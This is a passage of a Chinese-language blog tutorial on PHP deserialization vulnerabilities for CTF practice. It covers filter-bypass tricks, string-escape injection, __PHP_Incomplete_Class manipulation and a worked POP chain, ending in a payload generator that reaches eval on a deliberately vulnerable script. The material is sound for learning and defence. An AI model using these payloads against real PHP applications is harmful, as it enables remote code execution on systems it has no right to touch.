class="line">    public $a;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function match($data)&#123;</span><br><span class="line">    if (preg_match(&#x27;/^O:\d+/&#x27;,$data))&#123;</span><br><span class="line">        die(&#x27;you lose!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;</span><br><span class="line">// +号绕过</span><br><span class="line">$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);</span><br><span class="line">unserialize(match($b));</span><br><span class="line">// serialize(array($a));</span><br><span class="line">unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;);</span><br></pre></td></tr></table></figure></div>

<h4 id="十六进制绕过字符匹配"><a href="#十六进制绕过字符匹配" class="headerlink" title="# 十六进制绕过字符匹配"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E5%8C%B9%E9%85%8D" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 十六进制绕过字符匹配</h4><p>可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;name == &quot;flag&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;You did it!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = &#x27;&#x27;;</span><br><span class="line">if (strpos($str, &quot;flag&quot;) === false)</span><br><span class="line">&#123;</span><br><span class="line">    $obj = unserialize($str);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You can&#x27;t do it!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里检测了是否包含 <code>flag</code> 字符，我们可以尝试使用 <code>flag</code> 的十六进制 <code>\66\6c\61\67</code> 来绕过，构造以下:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></div>

<p>可以用下面 python 脚本将字符串转化为 Hex</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str = input(&#x27;Enter a string: &#x27;)</span><br><span class="line">print(&#x27;\\&#x27; + str.encode(&#x27;utf-8&#x27;).hex(&#x27;\\&#x27;))</span><br></pre></td></tr></table></figure></div>

<h4 id="利用‘引用’"><a href="#利用‘引用’" class="headerlink" title="# 利用‘引用’"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 利用‘引用’</h4><p>对于需要判断两个变量是否相等时，我们可以考虑使用引用来让两个变量始终相等.</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &#x27;abc&#x27;;</span><br><span class="line">        $this-&gt;b= &amp;$this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    public function  __destruct()&#123;</span><br><span class="line"></span><br><span class="line">        if($this-&gt;a===$this-&gt;b)&#123;</span><br><span class="line">            echo 666;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = serialize(new test());</span><br></pre></td></tr></table></figure></div>

<p>上面这个例子将 <code>$b</code> 设置为 <code>$a</code> 的引用，可以使 <code>$a</code> 永远与 <code>$b</code> 相等</p>
<h4 id="php-反序列化字符逃逸"><a href="#php-反序列化字符逃逸" class="headerlink" title="# php 反序列化字符逃逸"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> php 反序列化字符逃逸</h4><h5 id="情况一：过滤后字符过多"><a href="#情况一：过滤后字符过多" class="headerlink" title="# 情况一：过滤后字符过多"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E6%83%85%E5%86%B5%E4%B8%80%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E8%BF%87%E5%A4%9A" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 情况一：过滤后字符过多</h5><p>例如以下情形：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$name = $_GET[&#x27;name&#x27;];</span><br><span class="line">$age = &quot;I am 11&quot;;</span><br><span class="line">$arr = array($name,$age);</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;</span><br></pre></td></tr></table></figure></div>

<p>正常情况，传入 <code>name=mao</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/09/394sFvRJkYWAglS.png"
                      alt="image.png"
                ></p>
<p>如果此时多传入一个 x 的话会怎样，毫无疑问反序列化失败，由于溢出 (s 本来是 4 结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/09/im4EPGFUnTDd52o.png"
                      alt="image.png"
                ></p>
<p>那我们传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/09/Amz5WT7IJGrwKL3.png"
                      alt="image.png"
                ></p>
<p>传入 <code>name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code><br><code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> 这一部分一共二十个字符<br>由于一个 x 会被替换为两个，我们输入了一共 20 个 x，现在是 40 个，多出来的 20 个 x 其实取代了我们的这二十个字符 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> ，从而造成 <code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code> 的溢出，而 “ 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 <code>woaini</code><br>最后的；} 闭合反序列化全过程导致原来的 <code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code> 被舍弃，不影响反序列化过程</p>
<h5 id="情况二：过滤后字符变少"><a href="#情况二：过滤后字符变少" class="headerlink" title="# 情况二：过滤后字符变少"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E6%83%85%E5%86%B5%E4%BA%8C%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 情况二：过滤后字符变少</h5><p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure></div>

<p>正常情况传入 <code>name=mao&amp;age=11</code> 的结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/09/S8lKoWxiAdyDfna.png"
                      alt="image.png"
                ></p>
<p>构造一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/09/wrXv7GNB41Amlug.png"
                      alt="image.png"
                ></p>
<p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是 age 序列化后的结果</p>
<p>s:3:“age”;s:28:“11”;s:3:“age”;s:6:“woaini”;}”</p>
<p>由于前面是 40 个 x 所以导致少了 20 个字符，所以需要后面来补上， <code>&quot;;s:3:&quot;age&quot;;s:28:&quot;</code> 11 这一部分刚好 20 个，后面由于有” 闭合了前面因此后面的参数就可以由我们自定义执行了</p>
<h4 id="利用不完整类绕过序列化回旋镖"><a href="#利用不完整类绕过序列化回旋镖" class="headerlink" title="# 利用不完整类绕过序列化回旋镖"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%B1%BB%E7%BB%95%E8%BF%87%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%97%8B%E9%95%96" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 利用不完整类绕过序列化回旋镖</h4><p>当存在 <code>serialize(unserialize($x)) != $x</code> 这种很神奇的东西时，我们可以利用不完整类 <code>__PHP_Incomplete_Class</code> 来进行处理</p>
<p>当我们尝试反序列化到一个不存在的类是，PHP 会使用 <code>__PHP_Incomplete_Class_Name</code> 这个追加的字段来进行存储</p>
<p>我们于是可以尝试自己构造一个不完整类</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$raw = &#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;;</span><br><span class="line">$exp = &#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(serialize(unserialize($raw)) == $exp); // true</span><br></pre></td></tr></table></figure></div>

<p>这样就可以绕过了</p>
<p>更近一步，我们可以通过这个让一个对象被调用后凭空消失，只需要手动构造无 <code>__PHP_Incomplete_Class_Name</code> 的不完整对象</p>
<h5 id="serialize-函数在处理-PHP-Incomplete-Class-对象时所进行的特殊操作"><a href="#serialize-函数在处理-PHP-Incomplete-Class-对象时所进行的特殊操作" class="headerlink" title="# serialize () 函数在处理 __PHP_Incomplete_Class 对象时所进行的特殊操作"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#serialize-%E5%87%BD%E6%95%B0%E5%9C%A8%E5%A4%84%E7%90%86__php_incomplete_class%E5%AF%B9%E8%B1%A1%E6%97%B6%E6%89%80%E8%BF%9B%E8%A1%8C%E7%9A%84%E7%89%B9%E6%AE%8A%E6%93%8D%E4%BD%9C" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> serialize () 函数在处理 <code>__PHP_Incomplete_Class</code> 对象时所进行的特殊操作</h5><p>unserialize () 在发现当前 PHP 上下文中没有包含相关类的类定义时将创建一个 <code>__PHP_Incomplete_Class</code> 对象。而 serialize () 在发现需要进行序列化的对象是 <code>__PHP_Incomplete_Class</code> 后，将对其进行 特殊处理 以得到描述实际对象而非 <code>__PHP_Incomplete_Class</code> 对象的序列化文本，而这里就包含了 将属性的描述值减一 这一步。<br>那么对象所属类的名称是否会发生替换，序列化文本中的 <code>__PHP_Incomplete_Class_Name</code> 是否会被自动删除以使得序列化文本中的属性个数描述值与实际相符呢？对此，请参考如下示例：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">var_dump(serialize(unserialize(&#x27;O:22:&quot;__PHP_Incomplete_Class&quot;:3:&#123;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:7:&quot;MyClass&quot;;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&#x27;)));</span><br></pre></td></tr></table></figure></div>

<p>执行结果</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(69) &quot;O:7:&quot;MyClass&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;RedHeart&quot;;s:6:&quot;nation&quot;;s:5:&quot;China&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure></div>

<p>结合前面观察到的种种现象，我们可以总结出 serialize () 函数对 __PHP_Incomplete_Class 对象执行了如下 特殊操作（操作描述顺序并非 serialize 函数的实际操作顺序）：</p>
<p>将 <code>__PHP_Incomplete_Class</code> 对象中的 属性个数减一 并将其作为序列化文本中 对实际对象属性个数的描述值。<br>将 <code>__PHP_Incomplete_Class</code> 对象的 <code>__PHP_Incomplete_Class_Name</code> 作为序列化文本中 对象所属类的描述值。若未从 <code>__PHP_Incomplete_Class </code>对象 中检查到 <code>__PHP_Incomplete_Class_Name</code> 属性，则跳过此步。<br>将 <code>__PHP_Incomplete_Class </code>对象的序列化文本中对 <code>__PHP_Incomplete_Class_Name </code>属性的描述删去。若没有发现相关描述，则跳过此步。</p>
<p>关于 <code>__PHP_Incomplete_Class</code> 更详细的介绍 &lt;<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44879989/article/details/133486308" >PHP 反序列化漏洞：__PHP_Incomplete_Class 与 serialize (unserialize ($x)) !&#x3D;&#x3D; $x  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>&gt;</p>
<h4 id="对象注入"><a href="#对象注入" class="headerlink" title="# 对象注入"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 对象注入</h4><p>当用户的请求在传给反序列化函数 <code>unserialize()</code> 之前没有被正确的过滤时就会产生漏洞。因为 PHP 允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 <code>unserialize</code> 函数，最终导致一个在该应用范围内的任意 PHP 对象注入。</p>
<p><strong>对象漏洞</strong>出现得满足两个前提</p>
<blockquote>
<p>1、 <code>unserialize</code> 的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p>
</blockquote>
<p>比如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;y4mao&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = &#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;;</span><br><span class="line">unserialize($a);</span><br></pre></td></tr></table></figure></div>

<p>在脚本运行结束后便会调用 <code>_destruct</code> 函数，同时会覆盖 test 变量输出 <code>maomi</code></p>
<h3 id="POP"><a href="#POP" class="headerlink" title="# POP"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#pop" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> POP</h3><h4 id="————-魔法函数-———"><a href="#————-魔法函数-———" class="headerlink" title="# ———— 魔法函数 ———"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ———— 魔法函数 ———</h4><p>我需要再次提出魔法函数并且需要细致的解释供我更加深刻的理解</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发（对象不再被引用（unset），脚本执行结束）（当存在__destruct时，头一般是他）</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据（比如访问private属性或者不存在的属性的值时）或者不存在这个键（$this-&gt;str[&#x27;str&#x27;]-&gt;source）都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发（输出一个对象、属性，将对象或属性与字符串拼接，对对象或属性进行正则匹配）</span><br><span class="line">__invoke() //当尝试将对象（属性）调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div>

<p>会发现，我在很多魔法函数的触发方式的解释中对象后面都加了（属性），这与 php 官方手册和其他博客文章的解释有些许不同，在查找资料时产生了很多疑惑，比如我翻阅的其中一篇博客：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/10/4YHGV9zljdy67vL.png"
                      alt="5fd161f2f08ca123a0c6ccd8f4cc17cd.png"
                ></p>
<p>原文说此处触发了 <code>__toString</code> 函数，可明明只是将属性当作字符串，</p>
<p>再比如同一篇文章的另一处：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2024/04/10/Ktx4MPXFmGnZ7cS.png"
                      alt="28258fc1d508554e89f8f7d99d3855b1.png"
                ></p>
<p>触发了 <code>__invoke</code> 函数</p>
<p>在与小伙伴讨论之后，认为可以将属性看作对象</p>
<p>在弄清楚各种魔法函数触发条件之后就要开始构建 pop 链了</p>
<h4 id="POP-链"><a href="#POP-链" class="headerlink" title="# POP 链"></a><a class="link"   target="_blank" rel="noopener" href="https://fc04db.github.io/2024/04/09/PHP-Unserialize/#pop%E9%93%BE" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> POP 链</h4><p>POP 链构造首先就是要找到头和尾，也就是用户能传入参数的地方（头）和最终要执行函数方法的地方（尾）。找到头尾之后进行反推过程，从尾部开始一步步找到能触发上一步的地方，直到找到传参处，此时完整的 POP 链就显而易见了。CTF 赛中一般尾部就是 get flag 的方法，头部则是 GET&#x2F;POST 传参</p>
<p>举个例子：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class Hello</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str=$name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() // 1. destruct函数为pop链头</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source=$this-&gt;str;</span><br><span class="line">        echo $this-&gt;source; //输出变量，把类当作字符串，触发__toString</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString() // 2</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; //访问不存在的属性，触发_get</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Uwant</span><br><span class="line">&#123;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;params=&#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)&#123; // 3 </span><br><span class="line">        return $this-&gt;getshell($this-&gt;params); //直接调用getshell</span><br><span class="line">    &#125;</span><br><span class="line">    public function getshell($value)  // 4</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;params); //尾，输出</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;a&#x27;]; //GET传参头</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>先找链子的头和尾，头部明显是 GET 传参，尾部是 <code>Uwant</code> 类中的 <code>getshell</code> ，然后往上倒推， <code>Uwant</code> 类中的 <code>__get()</code> 中调用了 <code>getshell</code> ， <code>Show</code> 类中的 <code>toString</code> 调用了 <code>__get()</code> ，然后 <code>Hello</code> 类中的 <code>__destruct()</code> ，而我们 GET 传参之后会先进入 <code>__destruct()</code> ，这样子头和尾就连上了，所以说完整的链子就是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</span><br><span class="line">&lt;?php</span><br><span class="line">class Hello</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Uwant</span><br><span class="line">&#123;</span><br><span class="line">    public $params=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Hello();</span><br><span class="line">$b = new Show();</span><br><span class="line">$c = new Uwant();</span><br><span class="line">$a -&gt; str = $b;</span><br><span class="line">$b -&gt; str[&#x27;str&#x27;] = $c;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure></div>

